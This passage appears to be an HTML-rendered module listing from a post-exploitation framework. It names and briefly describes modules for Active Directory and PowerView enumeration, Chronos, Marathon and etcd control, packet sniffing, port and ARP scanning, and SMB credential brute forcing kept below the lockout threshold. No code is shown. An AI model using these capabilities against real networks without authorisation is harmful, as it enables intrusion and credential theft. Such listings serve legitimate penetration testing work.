style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        This module will use the current user context to query active</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        directory for a list of users in a group.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> python/situational_awareness/network/active_directory/get_computers</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        This module will list all computer objects from active directory</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> python/situational_awareness/network/active_directory/get_groupmemberships</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        This module check what groups a user is member of</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> python/situational_awareness/network/active_directory/dscl_get_groups</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        This module will use the current user context to query active</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        directory for a list of Groups.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> python/situational_awareness/network/dcos/chronos_api_start_job</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Start a Chronos job using the HTTP API service for the Chronos</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Framework</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> python/situational_awareness/network/dcos/etcd_crawler</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Pull keys and values from an etcd configuration store</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> python/situational_awareness/network/dcos/marathon_api_delete_app</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Delete a Marathon App using Marathon&#x27;s REST API</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> python/situational_awareness/network/dcos/chronos_api_add_job</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Add a Chronos job using the HTTP API service for the Chronos Framework</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> python/situational_awareness/network/dcos/chronos_api_delete_job</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Delete a Chronos job using the HTTP API service for the Chronos</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Framework</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> python/situational_awareness/network/dcos/marathon_api_create_start_app</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Create and Start a Marathon App using Marathon&#x27;s REST API</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> python/collection/osx/sniffer*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        This module will do a full network stack capture.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/get_sql_instance_domain</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Returns a list of SQL Server instances discovered by querying a domain</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        controller for systems with registered MSSQL service principal names.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        The function will default to the current user&#x27;s domain and logon</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        server, but an alternative domain controller can be provided. UDP</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        scanning of management servers is optional.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/get_spn</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Displays Service Principal Names (SPN) for domain accounts based on</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        SPN service name, domain account, or domain group via LDAP queries.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/get_sql_server_info</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Returns basic server and user information from target SQL Servers.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/arpscan</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Performs an ARP scan against a given range of IPv4 IP Addresses.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/smbscanner</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Tests a username/password combination across a number of machines.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/smbautobrute</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Runs an SMB brute against a list of usernames/passwords. Will check</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        the DCs to interrogate the bad password count of the users and will</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        keep bruting until either a valid credential is discoverd or the bad</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        password count reaches one below the threshold. Run &quot;shell net</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        accounts&quot; on a valid agent to determine the lockout threshold. VERY</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        noisy! Generates a ton of traffic on the DCs.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/bloodhound</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Execute BloodHound data collection.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/bloodhound3</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Execute BloodHound data collection (ingestor for version 3).</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/reverse_dns</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Performs a DNS Reverse Lookup of a given IPv4 IP Range.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/get_kerberos_service_ticket*</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Retrieves IP addresses and usernames using event ID 4769 this can</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        allow identification of a users machine. Can only run on a domain</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        controller.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/smblogin</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Validates username &amp; password combination(s) across a host or group of</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        hosts using the SMB protocol.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/portscan</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Does a simple port scan using regular sockets, based (pretty) loosely</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        on nmap.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/get_group</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Gets a list of all current groups in a domain, or all the groups a</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        given user/group object belongs to. Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/get_domain_policy</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Returns the default domain or DC policy for a given domain or domain</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        controller. Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/get_computer</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Queries the domain for current computer objects. Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/get_ou</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Gets a list of all current OUs in a domain. Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/process_hunter</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Query the process lists of remote machines, searching for processes</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        with a specific name or owned by a specific user. Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/get_loggedon</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Execute the NetWkstaUserEnum Win32API call to query a given host for</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        actively logged on users. Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/get_forest</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Return information about a given forest, including the root domain and</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        SID. Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/get_gpo_computer</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Takes a GPO GUID and returns the computers the GPO is applied to.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        (Note: This function was removed in PowerView. This now uses a</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        combination of two CmdLets to achieve the same functionality)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/find_managed_security_group</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        This function retrieves all security groups in the domain and</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        identifies ones that have a manager set. It also determines whether</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        the manager has the ability to add or remove members from the group.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/get_object_acl</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Returns the ACLs associated with a specific active directory object.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Part of PowerView. WARNING: specify a specific object, otherwise a</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        huge amount of data will be returned.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/get_fileserver</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Returns a list of all file servers extracted from user homedirectory,</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        scriptpath, and profilepath fields. Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/get_subnet_ranges</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Pulls hostnames from AD, performs a Reverse DNS lookup, and parses the</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        output into ranges.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/get_rdp_session</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Query a given RDP remote service for active sessions and originating</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        IPs (replacement for qwinsta). Note: needs admin rights on the remote</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        server you&#x27;re querying</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/map_domain_trust</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Maps all reachable domain trusts with .CSV output. Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/get_site</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Gets a list of all current sites in a domain. Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/get_group_member</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Returns the members of a given group, with the option to &quot;Recurse&quot; to</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        find all effective group members. Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/get_domain_controller</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Returns the domain controllers for the current domain or the specified</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        domain. Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/get_gpo</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Gets a list of all current GPOs in a domain. Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/find_foreign_user</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Enumerates users who are in groups outside of their principal domain.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/get_domain_trust</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Return all domain trusts for the current domain or a specified domain.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/find_foreign_group</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Enumerates all the members of a given domain&#x27;s groups and finds users</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        that are not in the queried domain. Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/get_localgroup</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Returns a list of all current users in a specified local group on a</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        local or remote machine. Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/get_subnet</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Gets a list of all current subnets in a domain. Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/get_session</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Execute the NetSessionEnum Win32API call to query a given host for</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        active sessions on the host. Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/get_cached_rdpconnection</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Uses remote registry functionality to query all entries for the</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Windows Remote Desktop Connection Client&quot; on a machine. Part of</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/user_hunter</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Finds which machines users of a specified group are logged into. Part</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/find_localadmin_access</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Finds machines on the local domain where the current user has local</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        administrator access. Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/find_gpo_location</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Takes a user/group name and optional domain, and determines the</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        computers in the domain the user/group has local admin (or RDP) rights</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        to. Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/set_ad_object</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        Takes a SID, name, or SamAccountName to query for a specified domain</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        object, and then sets a specified &quot;PropertyName&quot; to a specified</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        &quot;PropertyValue&quot;. Part of PowerView.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> powershell/situational_awareness/network/powerview/share_finder</span><br></span><span 